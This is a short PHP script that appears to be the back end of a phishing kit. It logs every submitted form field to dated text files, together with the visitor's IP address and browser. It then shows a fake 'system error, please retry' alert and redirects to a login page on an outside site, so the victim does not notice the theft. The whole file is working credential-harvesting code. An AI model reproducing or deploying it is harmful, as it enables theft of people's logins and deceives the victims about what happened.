<?php
// 获取POST数据
$data = $_POST;
$time = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

// 准备保存的内容
$content = "时间: $time\n";
$content .= "IP: $ip\n";
$content .= "UA: $ua\n";
$content .= "数据:\n";
foreach($data as $key => $value) {
    $content .= "$key: $value\n";
}
$content .= "------------------------\n";

// 保存到文件
$file = 'data/' . date('Y-m-d_H-i-s') . '.txt';
if(file_put_contents($file, $content, FILE_APPEND)) {
    // 显示错误提示并跳转
    echo '<script>alert("系统发生错误，请重试！"); window.location.href = "http://3389.idccms.com/wap/users/?m=login";</script>';
} else {
    die('数据保存失败');
}
?>